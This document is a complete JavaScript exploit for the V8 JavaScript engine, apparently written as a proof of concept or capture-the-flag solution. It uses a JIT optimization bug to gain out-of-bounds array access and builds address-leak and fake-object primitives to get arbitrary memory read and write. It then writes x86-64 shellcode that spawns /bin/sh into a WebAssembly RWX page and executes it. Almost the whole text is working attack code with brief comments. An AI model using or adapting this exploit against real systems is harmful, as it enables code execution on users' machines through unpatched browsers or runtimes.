const conv_ab = new ArrayBuffer(8);
const conv_f64 = new Float64Array(conv_ab);
const conv_u64 = new BigUint64Array(conv_ab);

const EMPTY_PROPERTIES_ADDR = 0x745n;
const MAP_JSARR_HOLEY_ELEMENTS_ADDR = 0x18be75n
const FAKE_JSARR_SZ = 13407872n;

function itof(x) {
    conv_u64[0] = BigInt(x);
    return conv_f64[0];
}

function ftoi(x) {
    conv_f64[0] = x;
    return conv_u64[0];
}

//Will get optimized into maglev to bypass oob checks on array access
function set_oob(oob, idx, what) {
    oob[idx] = what;
}

function get_oob(oob, idx) {
    return oob[idx];
}

function f() {
    let c;

    //Turbofan will OSR opt this loop, not the whole func cuz of v8_optimized_debug = false
    for (let i = 0; i < 20000; i++) {
        let a = 1, b = 1;
        a += b;
        b ++;
        c = a + b;
    }

    let victim = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9];
    let obj = [{}]; 
    
    //Turbofan thinks idx = 4*2 while its actually 5*2 
    //We're modifying the elements array of victim with huge1's elements with an arbitrary large size
    victim[c*2] = itof(((FAKE_JSARR_SZ * 2n) << 32n) | BigInt(0x500011));

    return [0, victim, obj];
}

//We create big arrays so v8 needs to extend the heap and as a result the address will be fixed
let huge1 = new Array(0xc9000/8)
huge1.fill(1.1);
let huge2 = new Array(0xc9000/4)
huge2.fill({});
let huge3 = new Array(0xc9000/8)
huge3.fill(1.1);
//Float64Array contains a the high bits of the heap cage which we will leak later
let heap_leak = new Float64Array(7);
heap_leak.fill(1.1);

let oob = 0;
let holey = [1.1, 2.2];
holey[3] = 3.3;
for (let a=0; a<20000; a++) {
    get_oob(holey, 0);
    set_oob(holey, 0, 1.1);
    oob = f()[1];
}

function GetAddressOf(x) {
    huge2[0] = x;
    return ((ftoi(get_oob(oob, 163840))) - 1n) & 0xffffffffn;
}

function GetFakeObject(x) { 
    set_oob(oob, 163840, itof(x));
    return huge2[0];   
}

let leak_offset = Number((GetAddressOf(heap_leak) - 0x500010n)/8n);
console.log("leak offset: "+leak_offset);

//Doing it normally fucks with the heap feng shui for some reason lmao
let leak = parseInt((ftoi(get_oob(oob, leak_offset + 6))).toString(16).substring(10), 16); 
console.log(ftoi(get_oob(oob, leak_offset + 6)).toString(16));
console.log("heap cage: 0x"+leak.toString(16));

let fake_arraybuf = [
    itof((EMPTY_PROPERTIES_ADDR << 32n) | BigInt(MAP_JSARR_HOLEY_ELEMENTS_ADDR)),
    itof(EMPTY_PROPERTIES_ADDR),
    itof(0x100000000011),
    itof(0x100000000000),
    itof(0xdeadbeef), //Low bits of backing store
    itof(0xdeadbeef), //High bits of backing store
    itof(0x200000011),
    itof(0xc00000565),
];

let FAKE_ARRAYBUF = GetAddressOf(fake_arraybuf)+1n;
let FAKE_ARRAYBUF_ELEMENTS = FAKE_ARRAYBUF + 124n + 0x40n;
console.log("FAKE: 0x"+(FAKE_ARRAYBUF_ELEMENTS).toString(16));
let fake = GetFakeObject(FAKE_ARRAYBUF_ELEMENTS);

//Set high bits to heap cage
fake_arraybuf[5] = itof((0x180000n << 32n) | BigInt(leak));

const expl_wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 3, 2, 0, 0, 5, 3, 1, 0, 2, 6, 42, 7, 127, 0, 65, 128, 8, 11, 127, 0, 65, 128, 8, 11, 127, 0, 65, 160, 14, 11, 127, 0, 65, 128, 8, 11, 127, 0, 65, 160, 142, 4, 11, 127, 0, 65, 0, 11, 127, 0, 65, 1, 11, 7, 130, 1, 10, 6, 109, 101, 109, 111, 114, 121, 2, 0, 17, 95, 95, 119, 97, 115, 109, 95, 99, 97, 108, 108, 95, 99, 116, 111, 114, 115, 0, 0, 4, 102, 117, 110, 99, 0, 1, 1, 103, 3, 0, 12, 95, 95, 100, 115, 111, 95, 104, 97, 110, 100, 108, 101, 3, 1, 10, 95, 95, 100, 97, 116, 97, 95, 101, 110, 100, 3, 2, 13, 95, 95, 103, 108, 111, 98, 97, 108, 95, 98, 97, 115, 101, 3, 3, 11, 95, 95, 104, 101, 97, 112, 95, 98, 97, 115, 101, 3, 4, 13, 95, 95, 109, 101, 109, 111, 114, 121, 95, 98, 97, 115, 101, 3, 5, 12, 95, 95, 116, 97, 98, 108, 101, 95, 98, 97, 115, 101, 3, 6, 10, 138, 1, 2, 3, 0, 1, 11, 131, 1, 0, 65, 128, 8, 66, 170, 213, 170, 213, 170, 213, 170, 213, 170, 127, 55, 3, 0, 65, 128, 8, 66, 184, 223, 204, 195, 134, 128, 228, 245, 9, 55, 3, 0, 65, 136, 8, 66, 200, 130, 131, 135, 130, 146, 228, 245, 9, 55, 3, 0, 65, 144, 8, 66, 200, 138, 188, 145, 150, 205, 219, 245, 9, 55, 3, 0, 65, 152, 8, 66, 208, 144, 165, 188, 142, 146, 228, 245, 9, 55, 3, 0, 65, 160, 8, 66, 177, 236, 199, 145, 141, 146, 228, 245, 9, 55, 3, 0, 65, 168, 8, 66, 184, 247, 128, 128, 128, 128, 228, 245, 9, 55, 3, 0, 65, 176, 8, 66, 143, 138, 192, 132, 137, 146, 228, 245, 9, 55, 3, 0, 11, 0, 201, 1, 9, 112, 114, 111, 100, 117, 99, 101, 114, 115, 1, 12, 112, 114, 111, 99, 101, 115, 115, 101, 100, 45, 98, 121, 1, 69, 65, 110, 100, 114, 111, 105, 100, 32, 40, 49, 49, 51, 52, 57, 50, 50, 56, 44, 32, 43, 112, 103, 111, 44, 32, 43, 98, 111, 108, 116, 44, 32, 43, 108, 116, 111, 44, 32, 45, 109, 108, 103, 111, 44, 32, 98, 97, 115, 101, 100, 32, 111, 110, 32, 114, 52, 56, 55, 55, 52, 55, 101, 41, 32, 99, 108, 97, 110, 103, 105, 49, 55, 46, 48, 46, 50, 32, 40, 104, 116, 116, 112, 115, 58, 47, 47, 97, 110, 100, 114, 111, 105, 100, 46, 103, 111, 111, 103, 108, 101, 115, 111, 117, 114, 99, 101, 46, 99, 111, 109, 47, 116, 111, 111, 108, 99, 104, 97, 105, 110, 47, 108, 108, 118, 109, 45, 112, 114, 111, 106, 101, 99, 116, 32, 100, 57, 102, 56, 57, 102, 52, 100, 49, 54, 54, 54, 51, 100, 53, 48, 49, 50, 101, 53, 99, 48, 57, 52, 57, 53, 102, 51, 98, 51, 48, 101, 99, 101, 51, 100, 50, 51, 54, 50, 41, 0, 44, 15, 116, 97, 114, 103, 101, 116, 95, 102, 101, 97, 116, 117, 114, 101, 115, 2, 43, 15, 109, 117, 116, 97, 98, 108, 101, 45, 103, 108, 111, 98, 97, 108, 115, 43, 8, 115, 105, 103, 110, 45, 101, 120, 116]);
let expl_wasm_mod = new WebAssembly.Module(expl_wasm_code);
let expl_wasm_instance = new WebAssembly.Instance(expl_wasm_mod);

let wasm_instance_addr = GetAddressOf(expl_wasm_instance) + 1n;
console.log("wasm instance addr: 0x"+wasm_instance_addr.toString(16));

fake_arraybuf[4] = itof((wasm_instance_addr+11n)<<32n);
var read = new Float64Array(fake);
let wasm_data_addr = ftoi(read[0]) & 0xffffffffn;

fake_arraybuf[4] = itof(((wasm_data_addr+0x27n)<<32n));
var read = new Float64Array(fake);
rwx = ftoi(read[0]);
console.log("rwx: 0x"+rwx.toString(16));

fake_arraybuf[4] = itof((rwx&0xffffffffn)<<32n);
fake_arraybuf[5] = itof((0x180000n << 32n) | BigInt(rwx>>32n));
var write = new Int8Array(fake);

console.log("Writing shellcode");
const SHELLCODE = [0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72, 0x69, 0x1, 0x1, 0x81, 0x34, 0x24, 0x1, 0x1, 0x1, 0x1, 0x31, 0xf6, 0x56, 0x6a, 0x8, 0x5e, 0x48, 0x1, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31, 0xd2, 0x6a, 0x3b, 0x58, 0xf, 0x5]
for(var i = 0; i < SHELLCODE.length; i++) write[i] = SHELLCODE[i];

console.log("Igniting");
expl_wasm_instance.exports.func();